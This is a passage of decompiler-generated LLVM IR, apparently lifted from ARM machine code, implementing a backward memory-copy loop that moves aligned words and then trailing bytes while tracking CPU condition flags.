  store i32 %v2_16e08, i32* %r0.global-to-local, align 4
  %v2_16e0c = add i32 %v1_16e04, -4
  store i32 %v2_16e0c, i32* %r2.global-to-local, align 4
  %v4_16e0c = sub i32 3, %v1_16e04
  %v5_16e0c = and i32 %v4_16e0c, %v1_16e04
  %v6_16e0c = icmp slt i32 %v5_16e0c, 0
  store i1 %v6_16e0c, i1* %cpsr_v.global-to-local, align 1
  %v7_16e0c = icmp slt i32 %v2_16e0c, 0
  store i1 %v7_16e0c, i1* %cpsr_n.global-to-local, align 1
  %v8_16e0c = icmp eq i32 %v1_16e04, 4
  store i1 %v8_16e0c, i1* %cpsr_z.global-to-local, align 1
  %v5_16e10 = icmp slt i32 %v1_16e04, 4
  br i1 %v5_16e10, label %bb150, label %dec_label_pc_16e14

dec_label_pc_16e14:                               ; preds = %dec_label_pc_16e04
  %v1_16e14 = urem i32 %v2_16e08, 4
  store i32 %v1_16e14, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e14 = icmp eq i32 %v1_16e14, 0
  store i1 %v2_16e14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e14, label %dec_label_pc_16e1c, label %dec_label_pc_16ebc

dec_label_pc_16e1c:                               ; preds = %dec_label_pc_16e14
  %v1_16e1c = urem i32 %v2_16e04, 4
  store i32 %v1_16e1c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e1c = icmp eq i32 %v1_16e1c, 0
  store i1 %v2_16e1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e1c, label %dec_label_pc_16e24, label %dec_label_pc_16ee8

dec_label_pc_16e24:                               ; preds = %dec_label_pc_16e1c, %dec_label_pc_16ee0
  %v0_16e3c36 = phi i32 [ %v2_16e08, %dec_label_pc_16e1c ], [ %v0_16f3019, %dec_label_pc_16ee0 ]
  %v0_16e3835 = phi i32 [ %v2_16e04, %dec_label_pc_16e1c ], [ %v0_16ee0, %dec_label_pc_16ee0 ]
  %v0_16e24 = phi i32 [ %v2_16e0c, %dec_label_pc_16e1c ], [ %v2_16ed8, %dec_label_pc_16ee0 ]
  %v2_16e24 = add i32 %v0_16e24, -8
  store i32 %v2_16e24, i32* %r2.global-to-local, align 4
  %v4_16e24 = sub i32 7, %v0_16e24
  %v5_16e24 = and i32 %v4_16e24, %v0_16e24
  %v6_16e24 = icmp slt i32 %v5_16e24, 0
  store i1 %v6_16e24, i1* %cpsr_v.global-to-local, align 1
  %v7_16e24 = icmp slt i32 %v2_16e24, 0
  store i1 %v7_16e24, i1* %cpsr_n.global-to-local, align 1
  %v8_16e24 = icmp eq i32 %v0_16e24, 8
  store i1 %v8_16e24, i1* %cpsr_z.global-to-local, align 1
  %v5_16e28 = icmp slt i32 %v0_16e24, 8
  br i1 %v5_16e28, label %dec_label_pc_16e74, label %dec_label_pc_16e2c

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e24
  %v3_16e2c = load i32, i32* @r4, align 4
  %v5_16e2c = inttoptr i32 %v3_16e2c to i8*
  store i8* %v5_16e2c, i8** %stack_var_-8, align 4
  %v8_16e2c = load i32, i32* @lr, align 4
  %v2_16e30 = add i32 %v0_16e24, -28
  store i32 %v2_16e30, i32* %r2.global-to-local, align 4
  %v4_16e30 = sub i32 27, %v0_16e24
  %v5_16e30 = and i32 %v4_16e30, %v2_16e24
  %v6_16e30 = icmp slt i32 %v5_16e30, 0
  store i1 %v6_16e30, i1* %cpsr_v.global-to-local, align 1
  %v7_16e30 = icmp slt i32 %v2_16e30, 0
  store i1 %v7_16e30, i1* %cpsr_n.global-to-local, align 1
  %v8_16e30 = icmp eq i32 %v2_16e24, 20
  store i1 %v8_16e30, i1* %cpsr_z.global-to-local, align 1
  %v5_16e34 = icmp slt i32 %v2_16e24, 20
  br i1 %v5_16e34, label %dec_label_pc_16e50, label %dec_label_pc_16e38

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e2c, %dec_label_pc_16e38.dec_label_pc_16e38_crit_edge
  %v0_16e3c = phi i32 [ %v1_16e44, %dec_label_pc_16e38.dec_label_pc_16e38_crit_edge ], [ %v0_16e3c36, %dec_label_pc_16e2c ]
  %v0_16e38 = phi i32 [ %v0_16e38.pre, %dec_label_pc_16e38.dec_label_pc_16e38_crit_edge ], [ %v0_16e3835, %dec_label_pc_16e2c ]
  %v1_16e38 = add i32 %v0_16e38, -4
  %v2_16e38 = inttoptr i32 %v1_16e38 to i32*
  %v3_16e38 = load i32, i32* %v2_16e38, align 4
  %v4_16e38 = add i32 %v0_16e38, -8
  %v5_16e38 = inttoptr i32 %v4_16e38 to i32*
  %v6_16e38 = load i32, i32* %v5_16e38, align 4
  store i32 %v6_16e38, i32* %r4.global-to-local, align 4
  %v7_16e38 = add i32 %v0_16e38, -12
  %v8_16e38 = inttoptr i32 %v7_16e38 to i32*
  %v9_16e38 = load i32, i32* %v8_16e38, align 4
  store i32 %v9_16e38, i32* %ip.global-to-local, align 4
  %v10_16e38 = add i32 %v0_16e38, -16
  %v11_16e38 = inttoptr i32 %v10_16e38 to i32*
  %v12_16e38 = load i32, i32* %v11_16e38, align 4
  store i32 %v12_16e38, i32* %lr.global-to-local, align 4
  store i32 %v10_16e38, i32* %r1.global-to-local, align 4
  %v1_16e3c = add i32 %v0_16e3c, -16
  %v2_16e3c = inttoptr i32 %v1_16e3c to i32*
  store i32 %v3_16e38, i32* %v2_16e3c, align 4
  %v4_16e3c = add i32 %v0_16e3c, -12
  %v5_16e3c = inttoptr i32 %v4_16e3c to i32*
  %v6_16e3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16e3c, i32* %v5_16e3c, align 4
  %v7_16e3c = add i32 %v0_16e3c, -8
  %v8_16e3c = inttoptr i32 %v7_16e3c to i32*
  %v9_16e3c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_16e3c, i32* %v8_16e3c, align 4
  %v10_16e3c = add i32 %v0_16e3c, -4
  %v11_16e3c = inttoptr i32 %v10_16e3c to i32*
  %v12_16e3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16e3c, i32* %v11_16e3c, align 4
  store i32 %v1_16e3c, i32* %r0.global-to-local, align 4
  %v0_16e40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e40 = add i32 %v0_16e40, -4
  %v2_16e40 = inttoptr i32 %v1_16e40 to i32*
  %v3_16e40 = load i32, i32* %v2_16e40, align 4
  store i32 %v3_16e40, i32* @r3, align 4
  %v4_16e40 = add i32 %v0_16e40, -8
  %v5_16e40 = inttoptr i32 %v4_16e40 to i32*
  %v6_16e40 = load i32, i32* %v5_16e40, align 4
  store i32 %v6_16e40, i32* %r4.global-to-local, align 4
  %v7_16e40 = add i32 %v0_16e40, -12
  %v8_16e40 = inttoptr i32 %v7_16e40 to i32*
  %v9_16e40 = load i32, i32* %v8_16e40, align 4
  store i32 %v9_16e40, i32* @ip, align 4
  %v10_16e40 = add i32 %v0_16e40, -16
  %v11_16e40 = inttoptr i32 %v10_16e40 to i32*
  %v12_16e40 = load i32, i32* %v11_16e40, align 4
  store i32 %v12_16e40, i32* %lr.global-to-local, align 4
  store i32 %v10_16e40, i32* %r1.global-to-local, align 4
  %v1_16e44 = add i32 %v0_16e3c, -32
  %v2_16e44 = inttoptr i32 %v1_16e44 to i32*
  store i32 %v3_16e40, i32* %v2_16e44, align 4
  %v4_16e44 = add i32 %v0_16e3c, -28
  %v5_16e44 = inttoptr i32 %v4_16e44 to i32*
  %v6_16e44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_16e44, i32* %v5_16e44, align 4
  %v7_16e44 = add i32 %v0_16e3c, -24
  %v8_16e44 = inttoptr i32 %v7_16e44 to i32*
  %v9_16e44 = load i32, i32* @ip, align 4
  store i32 %v9_16e44, i32* %v8_16e44, align 4
  %v10_16e44 = add i32 %v0_16e3c, -20
  %v11_16e44 = inttoptr i32 %v10_16e44 to i32*
  %v12_16e44 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16e44, i32* %v11_16e44, align 4
  store i32 %v1_16e44, i32* %r0.global-to-local, align 4
  %v0_16e48 = load i32, i32* %r2.global-to-local, align 4
  %v2_16e48 = add i32 %v0_16e48, -32
  store i32 %v2_16e48, i32* %r2.global-to-local, align 4
  %v6_16e4c = icmp slt i32 %v0_16e48, 32
  br i1 %v6_16e4c, label %dec_label_pc_16e50.loopexit, label %dec_label_pc_16e38.dec_label_pc_16e38_crit_edge

dec_label_pc_16e38.dec_label_pc_16e38_crit_edge:  ; preds = %dec_label_pc_16e38
  %v0_16e38.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16e38

dec_label_pc_16e50.loopexit:                      ; preds = %dec_label_pc_16e38
  %v4_16e48 = sub i32 31, %v0_16e48
  %v5_16e48 = and i32 %v4_16e48, %v0_16e48
  %v6_16e48 = icmp slt i32 %v5_16e48, 0
  %v7_16e48 = icmp slt i32 %v2_16e48, 0
  store i1 %v6_16e48, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16e48, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16e50

dec_label_pc_16e50:                               ; preds = %dec_label_pc_16e50.loopexit, %dec_label_pc_16e2c
  %v6_16e58 = phi i32 [ %v1_16e44, %dec_label_pc_16e50.loopexit ], [ %v0_16e3c36, %dec_label_pc_16e2c ]
  %v0_16e60.pr = phi i32 [ %v2_16e48, %dec_label_pc_16e50.loopexit ], [ %v2_16e30, %dec_label_pc_16e2c ]
  %v4_16e50 = add i32 %v0_16e60.pr, 16
  %v6_16e50 = sub i32 0, %v0_16e60.pr
  %v7_16e50 = and i32 %v4_16e50, %v6_16e50
  %v8_16e50 = icmp slt i32 %v7_16e50, 0
  store i1 %v8_16e50, i1* %cpsr_v.global-to-local, align 1
  %v9_16e50 = icmp slt i32 %v4_16e50, 0
  store i1 %v9_16e50, i1* %cpsr_n.global-to-local, align 1
  %v10_16e50 = icmp eq i32 %v4_16e50, 0
  store i1 %v10_16e50, i1* %cpsr_z.global-to-local, align 1
  %v5_16e54 = icmp slt i32 %v0_16e60.pr, -16
  br i1 %v5_16e54, label %.thread1, label %bb147

bb147:                                            ; preds = %dec_label_pc_16e50
  %v6_16e54 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e54 = add i32 %v6_16e54, -4
  %v8_16e54 = inttoptr i32 %v7_16e54 to i32*
  %v9_16e54 = load i32, i32* %v8_16e54, align 4
  store i32 %v9_16e54, i32* @r3, align 4
  %v10_16e54 = add i32 %v6_16e54, -8
  %v11_16e54 = inttoptr i32 %v10_16e54 to i32*
  %v12_16e54 = load i32, i32* %v11_16e54, align 4
  store i32 %v12_16e54, i32* %r4.global-to-local, align 4
  %v13_16e54 = add i32 %v6_16e54, -12
  %v14_16e54 = inttoptr i32 %v13_16e54 to i32*
  %v15_16e54 = load i32, i32* %v14_16e54, align 4
  store i32 %v15_16e54, i32* @ip, align 4
  %v16_16e54 = add i32 %v6_16e54, -16
  %v17_16e54 = inttoptr i32 %v16_16e54 to i32*
  %v18_16e54 = load i32, i32* %v17_16e54, align 4
  store i32 %v18_16e54, i32* %lr.global-to-local, align 4
  store i32 %v16_16e54, i32* %r1.global-to-local, align 4
  %v7_16e58 = add i32 %v6_16e58, -16
  %v8_16e58 = inttoptr i32 %v7_16e58 to i32*
  store i32 %v9_16e54, i32* %v8_16e58, align 4
  %v10_16e58 = add i32 %v6_16e58, -12
  %v11_16e58 = inttoptr i32 %v10_16e58 to i32*
  %v12_16e58 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16e58, i32* %v11_16e58, align 4
  %v13_16e58 = add i32 %v6_16e58, -8
  %v14_16e58 = inttoptr i32 %v13_16e58 to i32*
  %v15_16e58 = load i32, i32* @ip, align 4
  store i32 %v15_16e58, i32* %v14_16e58, align 4
  %v16_16e58 = add i32 %v6_16e58, -4
  %v17_16e58 = inttoptr i32 %v16_16e58 to i32*
  %v18_16e58 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16e58, i32* %v17_16e58, align 4
  store i32 %v7_16e58, i32* %r0.global-to-local, align 4
  %v6_16e5c = load i32, i32* %r2.global-to-local, align 4
  %v7_16e5c = add i32 %v6_16e5c, -16
  store i32 %v7_16e5c, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16e50, %bb147
  %v6_16e68 = phi i32 [ %v7_16e58, %bb147 ], [ %v6_16e58, %dec_label_pc_16e50 ]
  %v0_16e60 = phi i32 [ %v7_16e5c, %bb147 ], [ %v0_16e60.pr, %dec_label_pc_16e50 ]
  %v4_16e60 = add i32 %v0_16e60, 20
  store i32 %v4_16e60, i32* %r2.global-to-local, align 4
  %v6_16e60 = sub i32 0, %v0_16e60
  %v7_16e60 = and i32 %v4_16e60, %v6_16e60
  %v8_16e60 = icmp slt i32 %v7_16e60, 0
  store i1 %v8_16e60, i1* %cpsr_v.global-to-local, align 1
  %v9_16e60 = icmp slt i32 %v4_16e60, 0
  store i1 %v9_16e60, i1* %cpsr_n.global-to-local, align 1
  %v10_16e60 = icmp eq i32 %v4_16e60, 0
  store i1 %v10_16e60, i1* %cpsr_z.global-to-local, align 1
  %v5_16e64 = icmp slt i32 %v0_16e60, -20
  br i1 %v5_16e64, label %.thread3, label %bb148

bb148:                                            ; preds = %.thread1
  %v6_16e64 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e64 = add i32 %v6_16e64, -4
  %v8_16e64 = inttoptr i32 %v7_16e64 to i32*
  %v9_16e64 = load i32, i32* %v8_16e64, align 4
  store i32 %v9_16e64, i32* @r3, align 4
  %v10_16e64 = add i32 %v6_16e64, -8
  %v11_16e64 = inttoptr i32 %v10_16e64 to i32*
  %v12_16e64 = load i32, i32* %v11_16e64, align 4
  store i32 %v12_16e64, i32* @ip, align 4
  %v13_16e64 = add i32 %v6_16e64, -12
  %v14_16e64 = inttoptr i32 %v13_16e64 to i32*
  %v15_16e64 = load i32, i32* %v14_16e64, align 4
  store i32 %v15_16e64, i32* %lr.global-to-local, align 4
  store i32 %v13_16e64, i32* %r1.global-to-local, align 4
  %v7_16e68 = add i32 %v6_16e68, -12
  %v8_16e68 = inttoptr i32 %v7_16e68 to i32*
  store i32 %v9_16e64, i32* %v8_16e68, align 4
  %v10_16e68 = add i32 %v6_16e68, -8
  %v11_16e68 = inttoptr i32 %v10_16e68 to i32*
  %v12_16e68 = load i32, i32* @ip, align 4
  store i32 %v12_16e68, i32* %v11_16e68, align 4
  %v13_16e68 = add i32 %v6_16e68, -4
  %v14_16e68 = inttoptr i32 %v13_16e68 to i32*
  %v15_16e68 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16e68, i32* %v14_16e68, align 4
  store i32 %v7_16e68, i32* %r0.global-to-local, align 4
  %v6_16e6c = load i32, i32* %r2.global-to-local, align 4
  %v7_16e6c = add i32 %v6_16e6c, -12
  store i32 %v7_16e6c, i32* %r2.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread1, %bb148
  %v6_16e8c44 = phi i32 [ %v6_16e68, %.thread1 ], [ %v7_16e68, %bb148 ]
  %v0_16e7442 = phi i32 [ %v4_16e60, %.thread1 ], [ %v7_16e6c, %bb148 ]
  %v2_16e70 = load i8*, i8** %stack_var_-8, align 4
  %v3_16e70 = ptrtoint i8* %v2_16e70 to i32
  store i32 %v3_16e70, i32* @r4, align 4
  store i32 %v8_16e2c, i32* @lr, align 4
  br label %dec_label_pc_16e74

dec_label_pc_16e74:                               ; preds = %dec_label_pc_16e24, %.thread3
  %v7_16e84 = phi i32 [ %v0_16e3c36, %dec_label_pc_16e24 ], [ %v6_16e8c44, %.thread3 ]
  %v0_16e74 = phi i32 [ %v2_16e24, %dec_label_pc_16e24 ], [ %v0_16e7442, %.thread3 ]
  %v2_16e74 = add i32 %v0_16e74, 8
  store i32 %v2_16e74, i32* %r2.global-to-local, align 4
  %v4_16e74 = sub i32 0, %v0_16e74
  %v5_16e74 = and i32 %v2_16e74, %v4_16e74
  %v6_16e74 = icmp slt i32 %v5_16e74, 0
  store i1 %v6_16e74, i1* %cpsr_v.global-to-local, align 1
  %v7_16e74 = icmp slt i32 %v2_16e74, 0
  store i1 %v7_16e74, i1* %cpsr_n.global-to-local, align 1
  %v8_16e74 = icmp eq i32 %v2_16e74, 0
  store i1 %v8_16e74, i1* %cpsr_z.global-to-local, align 1
  %v5_16e78 = icmp slt i32 %v0_16e74, -8
  br i1 %v5_16e78, label %bb150, label %dec_label_pc_16e7c

dec_label_pc_16e7c:                               ; preds = %dec_label_pc_16e74
  %v6_16e7c = add i32 %v0_16e74, 4
  store i32 %v6_16e7c, i32* %r2.global-to-local, align 4
  %v8_16e7c = sub i32 -5, %v0_16e74
  %v9_16e7c = and i32 %v8_16e7c, %v2_16e74
  %v10_16e7c = icmp slt i32 %v9_16e7c, 0
  store i1 %v10_16e7c, i1* %cpsr_v.global-to-local, align 1
  %v11_16e7c = icmp slt i32 %v6_16e7c, 0
  store i1 %v11_16e7c, i1* %cpsr_n.global-to-local, align 1
  %v12_16e7c = icmp eq i32 %v2_16e74, 4
  store i1 %v12_16e7c, i1* %cpsr_z.global-to-local, align 1
  %v5_16e80 = icmp slt i32 %v2_16e74, 4
  %v6_16e80 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e80 = add i32 %v6_16e80, -4
  %v8_16e80 = inttoptr i32 %v7_16e80 to i32*
  %v9_16e80 = load i32, i32* %v8_16e80, align 4
  store i32 %v9_16e80, i32* @r3, align 4
  br i1 %v5_16e80, label %.thread7, label %bb149

.thread7:                                         ; preds = %dec_label_pc_16e7c
  store i32 %v7_16e80, i32* %r1.global-to-local, align 4
  %v8_16e84 = add i32 %v7_16e84, -4
  %v9_16e84 = inttoptr i32 %v8_16e84 to i32*
  store i32 %v9_16e80, i32* %v9_16e84, align 4
  %v10_16e84 = load i32, i32* %r0.global-to-local, align 4
  %v11_16e84 = add i32 %v10_16e84, -4
  store i32 %v11_16e84, i32* %r0.global-to-local, align 4
  %v0_16e94.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_16e7c
  %v10_16e88 = add i32 %v6_16e80, -8
  %v11_16e88 = inttoptr i32 %v10_16e88 to i32*
  %v12_16e88 = load i32, i32* %v11_16e88, align 4
  store i32 %v12_16e88, i32* @ip, align 4
  store i32 %v10_16e88, i32* %r1.global-to-local, align 4
  %v7_16e8c = add i32 %v7_16e84, -8
  %v8_16e8c = inttoptr i32 %v7_16e8c to i32*
  store i32 %v9_16e80, i32* %v8_16e8c, align 4
  %v10_16e8c = add i32 %v7_16e84, -4
  %v11_16e8c = inttoptr i32 %v10_16e8c to i32*
  %v12_16e8c = load i32, i32* @ip, align 4
  store i32 %v12_16e8c, i32* %v11_16e8c, align 4
  store i32 %v7_16e8c, i32* %r0.global-to-local, align 4
  %v6_16e90 = load i32, i32* %r2.global-to-local, align 4
  %v7_16e90 = add i32 %v6_16e90, -4
  store i32 %v7_16e90, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread7, %dec_label_pc_16e74, %dec_label_pc_16e04, %.thread13, %dec_label_pc_17038, %dec_label_pc_16fcc, %dec_label_pc_16f60, %bb149
  %v2_16e98 = phi i32 [ %v11_16e84, %.thread7 ], [ %v7_16e84, %dec_label_pc_16e74 ], [ %v2_16e08, %dec_label_pc_16e04 ], [ %v0_16f3019, %.thread13 ], [ %v2_16ea452, %dec_label_pc_17038 ], [ %v2_16ea451, %dec_label_pc_16fcc ], [ %v2_16ea450, %dec_label_pc_16f60 ], [ %v7_16e8c, %bb149 ]
  %v0_16e94 = phi i32 [ %v0_16e94.pre, %.thread7 ], [ %v2_16e74, %dec_label_pc_16e74 ], [ %v2_16e0c, %dec_label_pc_16e04 ], [ %v2_16ed8, %.thread13 ], [ %v0_16e9448, %dec_label_pc_17038 ], [ %v0_16e9447, %dec_label_pc_16fcc ], [ %v0_16e9446, %dec_label_pc_16f60 ], [ %v7_16e90, %bb149 ]
  %v1_16e94 = add i32 %v0_16e94, 4
  store i32 %v1_16e94, i32* @r2, align 4
  %v3_16e94 = sub i32 0, %v0_16e94
  %v4_16e94 = and i32 %v1_16e94, %v3_16e94
  %v5_16e94 = icmp slt i32 %v4_16e94, 0
  store i1 %v5_16e94, i1* %cpsr_v.global-to-local, align 1
  %v6_16e94 = icmp slt i32 %v1_16e94, 0
  store i1 %v6_16e94, i1* %cpsr_n.global-to-local, align 1
  %v7_16e94 = icmp eq i32 %v1_16e94, 0
  store i1 %v7_16e94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16e94, label %.thread129, label %bb151

bb151:                                            ; preds = %bb150
  %v1_16e9c = add i32 %v0_16e94, 2
  %v3_16e9c = sub i32 -3, %v0_16e94
  %v4_16e9c = and i32 %v3_16e9c, %v1_16e94
  %v5_16e9c = icmp slt i32 %v4_16e9c, 0
  store i1 %v5_16e9c, i1* %cpsr_v.global-to-local, align 1
  %v6_16e9c = icmp slt i32 %v1_16e9c, 0
  store i1 %v6_16e9c, i1* %cpsr_n.global-to-local, align 1
  %v7_16e9c = icmp eq i32 %v1_16e94, 2
  store i1 %v7_16e9c, i1* %cpsr_z.global-to-local, align 1
  %v0_16ea0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ea0 = add i32 %v0_16ea0, -1
  %v2_16ea0 = inttoptr i32 %v1_16ea0 to i8*
  %v3_16ea0 = load i8, i8* %v2_16ea0, align 1
  %v4_16ea0 = zext i8 %v3_16ea0 to i32
  store i32 %v4_16ea0, i32* @r3, align 4
  store i32 %v1_16ea0, i32* %r1.global-to-local, align 4
  %v3_16ea4 = add i32 %v2_16e98, -1
  %v4_16ea4 = inttoptr i32 %v3_16ea4 to i8*
  store i8 %v3_16ea0, i8* %v4_16ea4, align 1
  %v5_16ea4 = load i32, i32* %r0.global-to-local, align 4
  %v6_16ea4 = add i32 %v5_16ea4, -1
  store i32 %v6_16ea4, i32* %r0.global-to-local, align 4
  %v0_16ea8 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16ea8 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16ea8 = xor i1 %v0_16ea8, %v1_16ea8
  br i1 %v2_16ea8, label %.thread128, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16ea8 = load i32, i32* %r1.global-to-local, align 4
  %v4_16ea8 = add i32 %v3_16ea8, -1
  %v5_16ea8 = inttoptr i32 %v4_16ea8 to i8*
  %v6_16ea8 = load i8, i8* %v5_16ea8, align 1
  %v7_16ea8 = zext i8 %v6_16ea8 to i32
  store i32 %v7_16ea8, i32* @r3, align 4
  store i32 %v4_16ea8, i32* %r1.global-to-local, align 4
  %v6_16eac = add i32 %v5_16ea4, -2
  %v7_16eac = inttoptr i32 %v6_16eac to i8*
  store i8 %v6_16ea8, i8* %v7_16eac, align 1
  %v8_16eac = load i32, i32* %r0.global-to-local, align 4
  %v9_16eac = add i32 %v8_16eac, -1
  store i32 %v9_16eac, i32* %r0.global-to-local, align 4
  %v1_16eb0.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16eb0.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread128

.thread128:                                       ; preds = %bb151, %bb152
  %v7_16eb4 = phi i32 [ %v9_16eac, %bb152 ], [ %v6_16ea4, %bb151 ]
  %v2_16eb4 = phi i1 [ %v2_16eb0.pre, %bb152 ], [ %v1_16ea8, %bb151 ]
  %v1_16eb4 = phi i1 [ %v1_16eb0.pre, %bb152 ], [ %v0_16ea8, %bb151 ]
  %v0_16eb0 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16eb0 = xor i1 %v2_16eb4, %v1_16eb4
  %v4_16eb0 = or i1 %v0_16eb0, %v3_16eb0
  br i1 %v4_16eb0, label %.thread129, label %bb153

bb153:                                            ; preds = %.thread128
  %v5_16eb0 = load i32, i32* %r1.global-to-local, align 4
  %v6_16eb0 = add i32 %v5_16eb0, -1
  %v7_16eb0 = inttoptr i32 %v6_16eb0 to i8*
  %v8_16eb0 = load i8, i8* %v7_16eb0, align 1
  %v9_16eb0 = zext i8 %v8_16eb0 to i32
  store i32 %v9_16eb0, i32* @r3, align 4
  store i32 %v6_16eb0, i32* %r1.global-to-local, align 4
  %v8_16eb4 = add i32 %v7_16eb4, -1
  %v9_16eb4 = inttoptr i32 %v8_16eb4 to i8*
  store i8 %v8_16eb0, i8* %v9_16eb4, align 1
  %v10_16eb4 = load i32, i32* %r0.global-to-local, align 4
  %v11_16eb4 = add i32 %v10_16eb4, -1
  store i32 %v11_16eb4, i32* %r0.global-to-local, align 4
  br label %.thread129

dec_label_pc_16ebc:                               ; preds = %dec_label_pc_16e14
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16ebc = icmp eq i32 %v1_16e14, 1
  store i1 %v8_16ebc, i1* %cpsr_n.global-to-local, align 1
  %v9_16ebc = icmp eq i32 %v1_16e14, 2
  store i1 %v9_16ebc, i1* %cpsr_z.global-to-local, align 1
  %v1_16ec0 = add i32 %v2_16e04, -1
  %v2_16ec0 = inttoptr i32 %v1_16ec0 to i8*
  %v3_16ec0 = load i8, i8* %v2_16ec0, align 1
  %v4_16ec0 = zext i8 %v3_16ec0 to i32
  store i32 %v4_16ec0, i32* @r3, align 4
  store i32 %v1_16ec0, i32* %r1.global-to-local, align 4
  %v3_16ec4 = add i32 %v2_16e08, -1
  %v4_16ec4 = inttoptr i32 %v3_16ec4 to i8*
  store i8 %v3_16ec0, i8* %v4_16ec4, align 1
  %v5_16ec4 = load i32, i32* %r0.global-to-local, align 4
  %v6_16ec4 = add i32 %v5_16ec4, -1
  store i32 %v6_16ec4, i32* %r0.global-to-local, align 4
  br i1 %v8_16ebc, label %.thread13, label %bb154

bb154:                                            ; preds = %dec_label_pc_16ebc
  %v6_16ec8 = load i32, i32* %r1.global-to-local, align 4
  %v7_16ec8 = add i32 %v6_16ec8, -1
  %v8_16ec8 = inttoptr i32 %v7_16ec8 to i8*
  %v9_16ec8 = load i8, i8* %v8_16ec8, align 1
  %v10_16ec8 = zext i8 %v9_16ec8 to i32
  store i32 %v10_16ec8, i32* @r3, align 4
  store i32 %v7_16ec8, i32* %r1.global-to-local, align 4
  %v9_16ecc = add i32 %v5_16ec4, -2
  %v10_16ecc = inttoptr i32 %v9_16ecc to i8*
  store i8 %v9_16ec8, i8* %v10_16ecc, align 1
  %v11_16ecc = load i32, i32* %r0.global-to-local, align 4
  %v12_16ecc = add i32 %v11_16ecc, -1
  store i32 %v12_16ecc, i32* %r0.global-to-local, align 4
  br i1 %v9_16ebc, label %.thread13, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16ed0 = load i32, i32* %r1.global-to-local, align 4
  %v9_16ed0 = add i32 %v8_16ed0, -1
  %v10_16ed0 = inttoptr i32 %v9_16ed0 to i8*
  %v11_16ed0 = load i8, i8* %v10_16ed0, align 1
  %v12_16ed0 = zext i8 %v11_16ed0 to i32
  store i32 %v12_16ed0, i32* @r3, align 4
  store i32 %v9_16ed0, i32* %r1.global-to-local, align 4
  %v11_16ed4 = add i32 %v11_16ecc, -2
  %v12_16ed4 = inttoptr i32 %v11_16ed4 to i8*
  store i8 %v11_16ed0, i8* %v12_16ed4, align 1
  %v13_16ed4 = load i32, i32* %r0.global-to-local, align 4
  %v14_16ed4 = add i32 %v13_16ed4, -1
  store i32 %v14_16ed4, i32* %r0.global-to-local, align 4
  br label %.thread13

.thread13:                                        ; preds = %bb154, %dec_label_pc_16ebc, %bb155
  %v0_16f3019 = phi i32 [ %v12_16ecc, %bb154 ], [ %v6_16ec4, %dec_label_pc_16ebc ], [ %v14_16ed4, %bb155 ]
  %v0_16ed8 = load i32, i32* %r2.global-to-local, align 4
  %v1_16ed8 = load i32, i32* @ip, align 4
  %v2_16ed8 = sub i32 %v0_16ed8, %v1_16ed8
  store i32 %v2_16ed8, i32* %r2.global-to-local, align 4
  %v4_16ed8 = xor i32 %v1_16ed8, %v0_16ed8
  %v5_16ed8 = xor i32 %v2_16ed8, %v0_16ed8
  %v6_16ed8 = and i32 %v5_16ed8, %v4_16ed8
  %v7_16ed8 = icmp slt i32 %v6_16ed8, 0
  store i1 %v7_16ed8, i1* %cpsr_v.global-to-local, align 1
  %v8_16ed8 = icmp slt i32 %v2_16ed8, 0
  store i1 %v8_16ed8, i1* %cpsr_n.global-to-local, align 1
  %v9_16ed8 = icmp eq i32 %v0_16ed8, %v1_16ed8
  store i1 %v9_16ed8, i1* %cpsr_z.global-to-local, align 1
  %v5_16edc = icmp slt i32 %v0_16ed8, %v1_16ed8
  br i1 %v5_16edc, label %bb150, label %dec_label_pc_16ee0

dec_label_pc_16ee0:                               ; preds = %.thread13
  %v0_16ee0 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ee0 = urem i32 %v0_16ee0, 4
  store i32 %v1_16ee0, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ee0 = icmp eq i32 %v1_16ee0, 0
  store i1 %v2_16ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ee0, label %dec_label_pc_16e24, label %dec_label_pc_16ee8

dec_label_pc_16ee8:                               ; preds = %dec_label_pc_16e1c, %dec_label_pc_16ee0
  %v0_16f3018 = phi i32 [ %v2_16e08, %dec_label_pc_16e1c ], [ %v0_16f3019, %dec_label_pc_16ee0 ]
  %v0_16fdc = phi i32 [ %v2_16e0c, %dec_label_pc_16e1c ], [ %v2_16ed8, %dec_label_pc_16ee0 ]
